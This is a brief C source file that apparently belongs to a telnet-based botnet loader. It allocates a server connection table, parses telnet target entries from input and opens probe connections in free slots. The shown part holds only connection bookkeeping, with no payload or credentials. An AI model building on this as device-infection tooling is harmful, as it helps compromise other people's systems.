#include "includes.h"
#include "server.h"
#include "connection.h"
#include "telnet_info.h"
#include "util.h"

struct server *server_create(void) {
    struct server *srv = calloc(1, sizeof(struct server));
    if (srv == NULL) return NULL;

    srv->conns = calloc(MAX_CONNECTIONS, sizeof(struct connection *));
    if (srv->conns == NULL) {
        free(srv);
        return NULL;
    }

    pthread_mutex_init(&srv->lock, NULL);

    return srv;
}

void server_queue_telnet(struct server *srv, char *input) {
    struct telnet_info *info = telnet_info_parse(input);
    if (info == NULL) return;

    server_telnet_probe(srv, info);
}

void server_telnet_probe(struct server *srv, struct telnet_info *info) {
    pthread_mutex_lock(&srv->lock);

    int i;
    for (i = 0; i < MAX_CONNECTIONS; i++) {
        if (srv->conns[i] == NULL) break;
    }

    if (i == MAX_CONNECTIONS) {
        pthread_mutex_unlock(&srv->lock);
        return;
    }

    struct connection *conn = connection_open(srv, i, info);
    if (conn != NULL) {
        srv->conns[i] = conn;
        srv->curr_open++;
    }

    pthread_mutex_unlock(&srv->lock);
}
